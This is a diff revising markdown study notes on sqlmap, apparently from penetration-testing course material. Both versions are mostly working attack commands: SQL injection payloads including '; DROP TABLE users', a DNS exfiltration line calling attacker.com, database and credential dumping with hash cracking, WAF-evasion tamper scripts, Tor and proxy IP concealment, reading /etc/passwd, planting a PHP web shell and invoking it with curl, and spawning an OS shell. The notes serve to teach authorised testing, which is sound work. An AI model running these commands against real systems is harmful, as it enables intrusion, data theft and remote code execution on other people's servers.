@@ -1,462 +1,164 @@
-# SQLMAP
+# SQLMap Essentials
 
-## SQLMAP OVERVIEW
+SQLMap = open-source Python tool automating SQLi detection and exploitation, maintained since 2006. Covers target connection, injection detection, fingerprinting, enumeration, optimization, protection bypass (tamper scripts), DB content retrieval, file system access, and OS command execution. Widest DBMS support of any SQLi tool (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, MariaDB, and ~30 more). Install: preinstalled on Pwnbox/security distros, `sudo apt install sqlmap`, or `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git` → `python sqlmap.py`.
 
-Free, open-source, Python — automates SQLi detection and exploitation end to end. Been actively maintained since 2006, still the industry-standard tool for this.
+## SQLMap Overview
 
-```bash
-sudo apt install sqlmap
-```
+Techniques (`--technique=BEUSTQ`, all on by default):
 
-or straight from source:
+- **B — Boolean-based blind** (`AND 1=1`): TRUE/FALSE distinguished by response differences (content, HTTP code, titles, filtered text). ~1 bit per request, ~7-8 requests per character. Most common SQLi type in the wild.
+- **E — Error-based** (`AND GTID_SUBSET(@@version,0)`): DBMS errors carry query results in ~200-byte chunks. Faster than everything except UNION.
+- **U — Union query-based** (`UNION ALL SELECT 1,@@version,3`): injected results rendered in the response — potentially a whole table in one request. Fastest.
+- **S — Stacked queries** (`; DROP TABLE users`): piggy-back extra statements; needed for non-query statements (INSERT/UPDATE/DELETE); MSSQL and PostgreSQL support by default.
+- **T — Time-based blind** (`AND 1=IF(2>1,SLEEP(5),0)`): response time is the TRUE/FALSE signal. Slowest; used when boolean-based can't work (e.g. injection in a non-query statement with no page effect).
+- **Q — Inline queries** (`SELECT (SELECT @@version)`): query embedded in the original; uncommon.
+- **Out-of-band** (`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`): DNS exfiltration when everything else fails — sqlmap running on the controlled DNS domain collects data from non-existent subdomain lookups.
 
-```bash
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-python sqlmap.py
-```
+## Getting Started with SQLMap
 
-Already sitting on Pwnbox by default.
-
-Broadest DBMS coverage of any SQLi tool out there — MySQL, PostgreSQL, Oracle, MSSQL, SQLite, MariaDB, DB2, and dozens more niche ones. Full current list lives in `sqlmap -hh` or the wiki, not worth memorizing.
-
-## SQL INJECTION TYPES (BEUSTQ)
-
-`--technique` covers every known SQLi type, default is all of them at once:
-
-```
-B - Boolean-based blind
-E - Error-based
-U - UNION query-based
-S - Stacked queries
-T - Time-based blind
-Q - Inline queries
-```
-
-**Boolean-based blind** — TRUE vs FALSE gets read off response diffing (raw content, HTTP code, page title, filtered text). One bit per request, so figure ~7-8 requests to pull a single character. Most common SQLi type you'll actually run into.
-
-```sql
-AND 1=1
-```
-
-**Error-based** — DBMS error text comes back in the response, so a payload built to force a specific error smuggles data out through the error message itself. Fast — ~200-byte chunks per request, second only to UNION. Covers MySQL, PostgreSQL, Oracle, MSSQL, Sybase, Vertica, DB2, Firebird, MonetDB.
-
-```sql
-AND GTID_SUBSET(@@version,0)
-```
-
-**UNION query-based** — extend the original query, results ride back in the normal page response. Fastest type there is — best case, one request pulls an entire table.
-
-```sql
-UNION ALL SELECT 1,@@version,3
-```
-
-**Stacked queries** — piggyback extra statements after the vulnerable one with `;`. Only works if the backend actually supports it (MSSQL, PostgreSQL do by default) — needed for anything non-SELECT (INSERT/UPDATE/DELETE), and it's also sqlmap's route to OS command execution later on.
-
-```sql
-; DROP TABLE users
-```
-
-**Time-based blind** — same TRUE/FALSE logic as boolean-based, but read off response delay instead of content diff. Noticeably slower since every TRUE means sitting through the delay. This is the fallback when boolean-based can't apply — e.g. the vulnerable statement is a non-query action with zero effect on what gets rendered.
-
-```sql
-AND 1=IF(2>1,SLEEP(5),0)
-```
-
-**Inline queries** — a query nested directly inside the original one. Rare, needs the app written in a very specific way to even be possible.
-
-```sql
-SELECT (SELECT @@version) from
-```
-
-**Out-of-band** — most advanced type, for when everything else is unsupported or too slow. sqlmap does this through DNS exfiltration: control the DNS for a domain, force the target to resolve subdomains that carry the actual data as labels, read the requests hitting your own DNS server.
-
-```sql
-LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
-```
-
-## GETTING STARTED WITH SQLMAP
+Help: `-h` basic, `-hh` advanced (includes all target/request options), wiki = the manual.
 
 ```bash
-sqlmap -h     # essentials
-sqlmap -hh    # everything
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 ```
 
-Wiki is the real manual, CLI help is just a quick reference.
+`-u` = target URL, `--batch` = auto-answer every prompt with the default. The run reports each technique as it's confirmed, then prints the injection-point summary: parameter, type, title, and the working payload for each technique (boolean/error/time/UNION) — that payload list is the manual-exploitation cheat sheet. Everything logs to `~/.sqlmap/output/<target>/`, and session data there lets later runs resume without re-detecting.
 
-Classic vulnerable target — no sanitization on a GET param going straight into a query, errors turned on so any SQL hiccup gets reflected back:
+## SQLMap Output Description
 
-```php
-$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
-$result = mysqli_query($link, $sql);
-if (!$result) die("SQL error: ". mysqli_error($link));
-```
+What the log lines mean:
 
-Point sqlmap at it:
+- `target URL content is stable` — identical requests return consistent responses; differences from payloads are then meaningful (noise auto-removed otherwise).
+- `parameter appears to be dynamic` — value changes affect the response, so it's probably DB-linked. Static output = value not processed.
+- `heuristic (basic) test ... might be injectable (possible DBMS: 'MySQL')` — invalid-value probe caused a DBMS error. Indication, not proof.
+- `heuristic (XSS) test ...` — bonus XSS heuristic check, useful on big parameter sweeps.
+- `it looks like the back-end DBMS is 'MySQL'` — accept to skip other DBMSes' payloads; follow-up prompt extends level/risk for that DBMS.
+- `reflective value(s) found and filtering out` — payload echo in the response; filtered before comparison.
+- `appears to be ... injectable` — candidate finding; false-positives get removed by end-of-run logic checks. `(with --string="luther")` = a constant string distinguishes TRUE/FALSE, a strong signal.
+- `time-based comparison requires a larger statistical model` — collecting baseline response times to spot deliberate delays even on laggy networks.
+- `automatically extending ranges for UNION query` / `'ORDER BY' technique appears to be usable` — UNION checks are request-hungry (capped at 10 normally); a hit elsewhere extends the budget, and ORDER BY binary-search speeds column-count discovery.
+- `GET parameter 'id' is vulnerable` — confirmed. Keep testing other parameters only if you want the full report.
+- `sqlmap identified the following injection point(s)` — final, provably exploitable list.
+- `fetched data logged to text files under ...` — output/session directory for this target.
+
+## Running SQLMap on an HTTP Request
+
+Best setup trick: browser DevTools → Network → right-click the request → **Copy as cURL** → paste, swap `curl` for `sqlmap`. Identical headers, cookies, everything.
+
+- **GET**: `-u 'http://www.example.com/?id=1'` (a testable parameter, or auto-discovery flags `--crawl` / `--forms` / `-g`, is required).
+- **POST**: `--data 'uid=1&name=test'` tests both params; `-p uid` narrows to one; or mark inline with `*`: `--data 'uid=1*&name=test'`.
+- **Full request file**: `-r req.txt` — the entire HTTP request (captured in Burp, "Copy to file") for complex headers/bodies; `*` works inside the file too (`/?id=*`).
+- **Headers**: `--cookie='PHPSESSID=...'` or `-H='Cookie:...'`; same for `--host`, `--referer`, `-A`. `--random-agent` picks a real browser UA (many protections drop sqlmap's default UA outright); `--mobile` imitates a phone.
+- **Header injection**: put the marker after the value — `--cookie="id=1*"`.
+- **Other methods**: `--method PUT`.
+- **JSON/XML bodies**: supported via `--data` (simple) or `-r` (complex); sqlmap prompts to process JSON.
+
+## Handling SQLMap Errors
+
+Debugging ladder:
+
+- `--parse-errors` — surface DBMS errors inline during the run.
+- `-t /tmp/traffic.txt` — full sent/received traffic to a file for manual review.
+- `-v 6` — maximum verbosity: every request and response printed live.
+- `--proxy` — route everything through Burp for interactive inspection/replay.
+
+## Attack Tuning
+
+Payload anatomy: **vector** (the SQL payload itself) + **boundaries** (prefix/suffix wrapping that makes it fit the vulnerable statement).
+
+- **`--prefix` / `--suffix`** — for closures the default boundary set doesn't cover. E.g. code `WHERE id LIKE (('" . $_GET["q"] . "'))` needs `--prefix="%'))" --suffix="-- -"` to produce `... LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) ...`.
+- **`--level` (1-5, default 1)** — extends both boundaries and vectors by expectancy of success.
+- **`----risk` (1-3, default 1)** — extends vectors by risk of target-side damage (data loss/DoS). Raise it yourself when OR payloads are a must (login pages) — OR vectors against UPDATE/DELETE statements are why they're opt-in.
+- Payload counts: default = up to 72 per parameter; `--level=5 --risk=3` = 7,865. Watch the difference with `-v 3` (prints `[PAYLOAD]` lines).
+- **Comparison tuning**: `--code=200` (TRUE = that HTTP code), `--titles` (compare `<title>` only), `--string=success` (TRUE contains the value), `--text-only` (strip HTML tags, compare visible text).
+- **`--technique=BEU`** — e.g. skip time-based and stacked, run boolean/error/union.
+- **UNION tuning**: `--union-cols=17` (known column count), `--union-char=a` (different dummy filler), `--union-from=users` (DBMS needing a FROM appendix, e.g. Oracle).
+
+## Database Enumeration
+
+sqlmap carries per-DBMS query sets (queries.xml) — `inband` variants for UNION/error-based, `blind` variants (row-by-row, LIMIT %d,1) for blind situations. After detection, later runs resume the injection from session files and go straight to enumeration.
+
+Basics in one command:
 
 ```bash
-sqlmap -u "<TARGET_URL>?id=1" --batch
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
 ```
 
-`--batch` auto-picks the default answer for every prompt — the one you'll want for anything non-interactive.
-
-A normal run: confirm the param's dynamic → heuristic guess at the DBMS → offer to skip other DBMS-specific payloads → run through each technique → report exact payload + type per finding → fingerprint the backend DBMS and web stack. Everything gets cached under `~/.sqlmap/output/<target>/` — rerun against the same target later and it skips straight past re-detection using that session data.
-
-## SQLMAP OUTPUT DESCRIPTION
-
-Actually worth reading these instead of scrolling past — they tell you exactly what got found and how, which is most of your report write-up done for you.
-
-```
-target URL content is stable        no noise between identical requests — good, means diffing will actually work
-parameter appears to be dynamic     param really changes the response; "static" = probably the wrong one to target
-might be injectable (DBMS: X)       heuristic hit from an intentionally garbled value (e.g. ?id=1",)..).))') triggering a DBMS-specific error — not proof yet, gets confirmed properly next
-might be vulnerable to XSS          free side-check sqlmap runs regardless — handy signal on big multi-param sweeps
-back-end DBMS is 'X'? skip others?  narrows all remaining tests to just that DBMS once there's a clear signal
-extend level/risk for 'X'?          runs the full payload set for that specific DBMS instead of just the top picks
-reflective value(s) found           payload junk showing up in the response itself — sqlmap filters this automatically, not a problem
-appears to be 'X' injectable (--string="Y")   confirmed via a constant marker string — most reliable kind of hit, skips fuzzy comparison entirely
-time-based comparison requires larger statistical model   building a baseline of normal response times before it'll trust a delay as real
-extending ranges for UNION query    UNION tests are expensive so they're capped by default — get the full budget once another technique already confirms the target's vulnerable
-'ORDER BY' technique appears usable fast binary-search path to the right column count instead of brute-forcing 1 through 20
-parameter is vulnerable             confirmed, not heuristic — decide here whether to keep hunting other params or call it
-identified injection point(s) (N requests)   final proof-of-exploit: type, title, exact payload per technique that worked
-fetched data logged to ...          local session cache path — every future run against this target reuses it
-```
-
-## RUNNING SQLMAP ON AN HTTP REQUEST
-
-### CURL COMMANDS
-
-Fastest clean setup: Copy as cURL from the browser's Network tab, paste, swap `curl` for `sqlmap`:
+Tables and dumps:
 
 ```bash
-sqlmap '<TARGET_URL>?id=1' -H 'User-Agent: <UA_STRING>' --compressed -H 'Connection: keep-alive'
+sqlmap -u ... --tables -D testdb
+sqlmap -u ... --dump -T users -D testdb                      # CSV to ~/.sqlmap/output/<target>/dump/...
+sqlmap -u ... --dump -T users -D testdb -C name,surname      # column subset
+sqlmap -u ... --dump -T users -D testdb --start=2 --stop=3   # row range
+sqlmap -u ... --dump -T users -D testdb --where="name LIKE 'f%'"
+sqlmap -u ... --dump -D testdb                                # whole database
+sqlmap -u ... --dump-all --exclude-sysdbs                     # everything, skip system DBs
 ```
 
-### GET/POST REQUESTS
+`--dump-format` selects CSV (default), HTML, or SQLite for later offline browsing. DB `root`/DBA ≠ OS root — DBMS-privileged, but modern deployments keep OS privileges minimal.
 
-GET param → `-u`. POST body → `--data`:
+## Advanced Database Enumeration
+
+- **`--schema`** — full structure: every database/table/column with types.
+- **`--search`** — LIKE search across identifiers when the schema is huge: `--search -T user` (tables named *user*), `--search -C pass` (columns named *pass* — instantly locates password columns across the DBMS).
+- **Password cracking** — `--dump` recognizes hash formats and offers a built-in dictionary attack (31 hash algorithms, 1.4M-entry wordlist, multiprocess): dumped rows come back with `(cleartext)` annotations.
+- **`--passwords`** — DBMS-level user credentials (mysql.user etc.), same crack prompt, e.g. `root ... clear-text password: testpass`.
+- **`--all --batch`** — automate the entire enumeration; long-running, dig through the output files afterward.
+
+## Bypassing Web Application Protections
+
+- **Anti-CSRF tokens**: `--csrf-token="csrf-token"` — sqlmap re-parses fresh tokens from responses; params containing csrf/xsrf/token trigger an auto-prompt anyway.
+- **Unique-value params**: `--randomize=rp` — randomize the named param's value per request.
+- **Calculated params**: `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"` — Python evaluated before each request for digest-style checks (h=MD5(id)).
+- **IP concealing**: `--proxy="socks4://ip:port"`, `--proxy-file` (rotate on failure), `--tor` (auto-finds local SOCKS 9050/9150), `--check-tor` (verifies via check.torproject.org).
+- **WAF**: initial probe sends a malicious-looking payload on a nonexistent param; ModSecurity answers 406. Detection uses identYwaf signatures (80 WAFs). `--skip-waf` skips the noise.
+- **UA blacklisting**: `--random-agent` — first thought on immediate 5XX errors.
+- **Tamper scripts** — `--tamper=script1,script2` (chained by priority). Notables:
+
+```text
+0eunion                    UNION → e0UNION
+base64encode               base64 the payload
+between                    > → NOT BETWEEN 0 AND #, = → BETWEEN # AND #
+commalesslimit             LIMIT M,N → LIMIT N OFFSET M
+equaltolike                = → LIKE
+halfversionedmorekeywords  versioned comment before each keyword
+modsecurityversioned/zeroversioned  embrace query in (zero-)versioned comment
+percentage                 SELECT → %S%E%L%E%C%T
+randomcase                 SELECT → SEleCt
+space2comment / space2dash / space2hash / space2plus / space2randomblank / space2mssqlblank   space variants
+symboliclogical            AND/OR → && / ||
+versionedkeywords / versionedmorekeywords   versioned-comment per keyword
+```
+
+`--list-tampers` for all; custom scripts possible (e.g. second-order SQLi).
+
+- **`--chunked`** — split POST body into chunks so blacklisted keywords straddle boundaries.
+- **HPP** — payload split across repeated param names (`?id=1&id=UNION&id=SELECT...`) on platforms that concatenate them (ASP).
+
+## OS Exploitation
+
+File ops need privileges (MySQL: LOAD DATA + INSERT to read via `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`; write additionally needs `secure_file_priv` permitting it). DBA makes it all likely — check with `--is-dba` first (`current user is DBA: True/False`).
+
+**Read files:**
 
 ```bash
-sqlmap '<TARGET_URL>' --data 'uid=1&name=test'
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+# saved to ~/.sqlmap/output/<target>/files/_etc_passwd
 ```
 
-Every param in the body gets tested by default. Narrow to one with `-p uid`, or mark the exact spot yourself with `*`:
-
-```bash
-sqlmap '<TARGET_URL>' --data 'uid=1*&name=test'
-```
-
-### FULL HTTP REQUESTS
-
-Complex request, lots of headers, long POST body — grab the raw request (Burp: right-click → Copy to file, or browser: Copy > Copy Request Headers), save it, run with `-r`:
-
-```bash
-sqlmap -r req.txt
-```
-
-Same `*` injection marker works inside the saved file too.
-
-### CUSTOM SQLMAP REQUESTS
-
-Manual header control without a full request file:
-
-```bash
-sqlmap ... --cookie='PHPSESSID=<VALUE>'
-sqlmap ... -H='Cookie:PHPSESSID=<VALUE>'
-```
-
-Same pattern for `--host`, `--referer`, `-A`/`--user-agent`. Default `--random-agent` on principle — sqlmap's stock UA string (`sqlmap/x.x.x (http://sqlmap.org)`) is a known signature that a lot of protections drop on sight. `--mobile` fakes a phone UA instead.
-
-Headers themselves are testable too, not just params — same `*` marker after the value:
-
-```bash
---cookie="id=1*"
-```
-
-Non-GET/POST method:
-
-```bash
-sqlmap -u www.target.com --data='id=1' --method PUT
-```
-
-### CUSTOM HTTP REQUESTS
-
-JSON and XML bodies both work — short ones fit fine in `--data`, longer or messier ones go through `-r` same as any complex request:
-
-```bash
-sqlmap -r req.txt
-```
-
-sqlmap auto-detects JSON in the body and asks whether to process it as structured data before testing.
-
-## HANDLING SQLMAP ERRORS
-
-`--parse-errors` surfaces the actual DBMS error text in the console — first thing to flip on when a run isn't behaving:
-
-```bash
-sqlmap -u "<TARGET_URL>" --parse-errors
-```
-
-`-t` dumps every request+response pair to a file for manual diffing:
-
-```bash
-sqlmap -u "<TARGET_URL>" --batch -t /tmp/traffic.txt
-```
-
-`-v 6` is the same idea live in the terminal instead:
-
-```bash
-sqlmap -u "<TARGET_URL>" -v 6 --batch
-```
-
-`--proxy` routes everything through Burp so you get repeat/intercept/manual tampering on top of the automation:
-
-```bash
-sqlmap -u "<TARGET_URL>" --proxy=http://127.0.0.1:8080
-```
-
-## ATTACK TUNING
-
-Every payload = vector (the actual SQL doing the work) + boundary (prefix/suffix that fits it into the injection context). Default boundaries cover most cases, but sometimes you need to hand-build one:
-
-```bash
-sqlmap -u "<TARGET_URL>/?q=test" --prefix="%'))" --suffix="-- -"
-```
-
-matches a query shaped like `WHERE id LIKE (('<input>'))`.
-
-`--level` (1-5, default 1) widens both vectors and boundaries tried — lower-probability ones get included as it climbs. `--risk` (1-3, default 1) widens vectors by how likely they are to actually damage something (data loss, DoS), not by detection odds — OR-based payloads sit in the higher risk tiers since they can misfire against DELETE/UPDATE. Payload count scales hard: 72 at defaults, ~7,865 at `--level=5 --risk=3`. Don't just max these out — only bump them when there's an actual reason, like a login form where OR-based logic is the only realistic shape the injection could take.
-
-`-v 3`+ shows the literal `[PAYLOAD]` lines going out — the only real way to see what a level/risk change is actually doing differently.
-
-Fine-tuning for tricky detection surfaces:
-
-```
---code=200        pin TRUE detection to a specific HTTP status
---titles           compare based on <title> content only
---string=<VALUE>   pin TRUE detection to one known marker string
---text-only        strip HTML tags, compare visible text only
---technique=BEU    restrict to specific technique letters — useful for dropping ones causing trouble, e.g. time-based triggering timeouts
-```
-
-UNION-specific, when defaults don't line up with the real query:
-
-```
---union-cols=17          exact column count, if you already worked it out manually
---union-char='a'         swap for sqlmap's default NULL/int filler values
---union-from=users       required FROM appendix some DBMS need (e.g. Oracle) — auto-detection needs the DBMS name first, which might not be known yet at this point
-```
-
-## DATABASE ENUMERATION
-
-sqlmap has the actual query text for every enum action baked in per DBMS (`queries.xml`) — banner, current user, table listings, all of it. If detection already succeeded earlier, enumeration skips straight to querying using the cached session.
-
-One-shot basic recon:
-
-```bash
-sqlmap -u "<TARGET_URL>?id=1" --banner --current-user --current-db --is-dba
-```
-
-gives version banner, active DB user, active database, and whether that user has DBA rights.
-
-Table listing once you've got a DB name:
-
-```bash
-sqlmap -u "<TARGET_URL>" --tables -D testdb
-```
-
-Full table dump:
-
-```bash
-sqlmap -u "<TARGET_URL>" --dump -T users -D testdb
-```
-
-Lands as a local CSV by default — `--dump-format` for HTML or SQLite instead.
-
-Narrow to specific columns:
-
-```bash
-sqlmap -u "<TARGET_URL>" --dump -T users -D testdb -C name,surname
-```
-
-Narrow to a row range:
-
-```bash
-sqlmap -u "<TARGET_URL>" --dump -T users -D testdb --start=2 --stop=3
-```
-
-Narrow by condition:
-
-```bash
-sqlmap -u "<TARGET_URL>" --dump -T users -D testdb --where="name LIKE 'f%'"
-```
-
-Drop `-T` to dump the whole database; `--dump-all` for every database on the server. Always pair `--dump-all` with `--exclude-sysdbs` — system DBs are just noise, never the target.
-
-## ADVANCED DATABASE ENUMERATION
-
-Full schema across every DB in one shot — good for getting your bearings fast on something unfamiliar:
-
-```bash
-sqlmap -u "<TARGET_URL>" --schema
-```
-
-Search by name instead of browsing blind — matches table names via `LIKE`:
-
-```bash
-sqlmap -u "<TARGET_URL>" --search -T user
-```
-
-Same for column names:
-
-```bash
-sqlmap -u "<TARGET_URL>" --search -C pass
-```
-
-Both offer to dump matches on the spot — fast way to triage where the actually-interesting data lives across a database with dozens of tables.
-
-Password hashes get handled automatically — anything dumped that looks like a known hash format triggers an offer to dictionary-attack it right there (multi-process, ~1.4M-entry bundled wordlist, 31 supported hash types). Don't expect it to crack anything serious, but it's free and instant against weak or reused passwords.
-
-DB-level credential dump — the DBMS's own internal accounts, not app table data:
-
-```bash
-sqlmap -u "<TARGET_URL>" --passwords --batch
-```
-
-`--all --batch` runs the entire sweep end to end, no stopping to ask anything. Can take a genuinely long time — plan to comb the output files afterward rather than watching it live.
-
-## BYPASSING WEB APPLICATION PROTECTIONS
-
-### ANTI-CSRF TOKEN BYPASS
-
-`--csrf-token=<PARAM_NAME>` tells sqlmap which field holds the token so it can re-parse and refresh it out of each response before firing the next request. Even without specifying it, sqlmap prompts on its own if a param name looks token-shaped (`csrf`, `xsrf`, `token` substrings).
-
-```bash
-sqlmap -u "<TARGET_URL>" --data="id=1&csrf-token=<VALUE>" --csrf-token="csrf-token"
-```
-
-### UNIQUE VALUE BYPASS
-
-No parsing needed here — just randomize a param's value on every request:
-
-```bash
-sqlmap -u "<TARGET_URL>/?id=1&rp=29125" --randomize=rp
-```
-
-### CALCULATED PARAMETER BYPASS
-
-One param has to be a function of another — commonly an MD5 digest of it. `--eval` runs raw Python right before each request to compute it fresh:
-
-```bash
-sqlmap -u "<TARGET_URL>/?id=1&h=<HASH>" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
-```
-
-### IP ADDRESS CONCEALING
-
-Single proxy, or a rotating list that auto-skips on failure/blacklist:
-
-```bash
---proxy="socks4://<IP>:<PORT>"
---proxy-file=<LIST_FILE>
-```
-
-Tor instead — auto-detects the local SOCKS port (9050 or 9150):
-
-```bash
---tor
---check-tor    # confirms via check.torproject.org
-```
-
-### WAF BYPASS
-
-Every run fires a deliberately ugly-looking payload on a bogus param name early on, just to see how the target reacts — a big response delta (ModSecurity's classic 406, for instance) confirms something's sitting in front of it, and a bundled fingerprint library (identYwaf, ~80 signatures) tries to name what. `--skip-waf` skips this probe entirely if you want less noise on the wire.
-
-### USER-AGENT BLACKLISTING BYPASS
-
-sqlmap's default UA string is a known, easily-blocked signature. First thing to try on unexplained 5xx errors right from the start of a run:
-
-```bash
---random-agent
-```
-
-### TAMPER SCRIPTS
-
-Python scripts that rewrite the request right before it goes out — built specifically to slip past naive WAF/IPS pattern matching. Chain several with `--tamper=<a>,<b>`, they run in a fixed internal priority order so syntax-rewriting ones don't collide with pure content ones.
-
-```
-0eunion                     UNION → e0UNION
-base64encode                base64-encodes the entire payload
-between                     > → NOT BETWEEN 0 AND #, = → BETWEEN # AND #
-commalesslimit               LIMIT M,N → LIMIT N OFFSET M (MySQL)
-equaltolike                  = → LIKE
-halfversionedmorekeywords    prepends a MySQL versioned comment to each keyword
-modsecurityversioned         wraps the entire query in a MySQL versioned comment
-modsecurityzeroversioned     same, zero-versioned
-percentage                   %S%E%L%E%C%T-style char prefixing
-plus2concat                  + → CONCAT() (MSSQL)
-randomcase                   SEleCt-style random casing
-space2comment                space → /**/-style comment
-space2dash                   space → -- + random string + newline
-space2hash                   space → # + random string + newline (MySQL)
-space2mssqlblank             space → alternate MSSQL blank char
-space2plus                   space → +
-space2randomblank            space → random valid blank char
-symboliclogical               AND/OR → && / ||
-versionedkeywords            wraps each non-function keyword in a MySQL versioned comment
-versionedmorekeywords        wraps every keyword in a MySQL versioned comment
-```
-
-Full current list: `--list-tampers`. Can write your own too — useful for oddball cases like second-order SQLi that the built-in ones don't cover.
-
-### MISCELLANEOUS BYPASSES
-
-`--chunked` splits the POST body into chunks so a blacklisted keyword never appears whole in any single piece. HTTP Parameter Pollution does the same splitting trick a different way — across repeated same-name params instead (`?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`), relying on the backend concatenating repeated params back together (ASP does this).
-
-## OS EXPLOITATION
-
-**File read** needs specific DB privileges, not just "being DBA" in the abstract — MySQL wants `LOAD DATA` + `INSERT`, since a read is really "load the file into a table, then read the table":
-
-```sql
-LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
-```
-
-DBA rights make this a lot more likely but aren't the exact same permission. Check first:
-
-```bash
-sqlmap -u "<TARGET_URL>" --is-dba
-```
-
-Then just let sqlmap do it:
-
-```bash
-sqlmap -u "<TARGET_URL>" --file-read "/etc/passwd"
-```
-
-Saved locally under the same session cache directory as everything else.
-
-**File write** is locked down harder than read, for the obvious reason — it's a straight line to a web shell. MySQL specifically needs `secure_file_priv` disabled DB-side, plus real OS write permission in the target directory.
+**Write files** (e.g. a web shell to the webroot):
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
-sqlmap -u "<TARGET_URL>" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+curl http://www.example.com/shell.php?cmd=ls+-la
 ```
 
-Confirmed write = confirmed RCE — just hit it:
+**OS shell:**
 
 ```bash
-curl "http://<TARGET_IP>/shell.php?cmd=id"
+sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 
-**OS shell** — sqlmap will get you here without writing anything by hand, using UDFs, output-capturing SQL functions, or a direct command-exec statement where one exists (`xp_cmdshell` on MSSQL):
-
-```bash
-sqlmap -u "<TARGET_URL>" --os-shell
-```
-
-The default technique choice can quietly fail — falls back to UNION and sometimes reports "No output" even when it actually worked internally. If that happens, force a technique more likely to surface real output, error-based being the good first retry:
-
-```bash
-sqlmap -u "<TARGET_URL>" --os-shell --technique=E
-```
-
-Prompts for the web language and a writable directory if it can't auto-detect either — both get answered automatically under `--batch` using sensible defaults (detected language, common webroot paths).
+Prompts (auto-answered with `--batch`) for the web language (PHP default) and the webroot — common locations list, custom, or brute-force search. Uses file-write stagers, UDF tricks (sys_eval/sys_exec from an uploaded .so), or DB-native command execution (xp_cmdshell on MSSQL). If the default technique stalls ("No output"), pin a better one: `--os-shell --technique=E`.
